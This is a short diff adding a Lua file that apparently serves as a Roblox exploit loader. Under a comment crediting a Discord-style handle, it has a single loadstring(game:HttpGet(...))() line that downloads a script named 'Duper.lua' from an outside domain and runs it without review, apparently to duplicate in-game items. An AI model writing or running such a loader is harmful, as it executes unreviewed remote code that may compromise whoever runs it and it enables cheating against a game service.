@@ -1,0 +1,3 @@
+--//remorse#8106
+
+loadstring(game:HttpGet("https://fourdevils.gq/Duper.lua", true))()
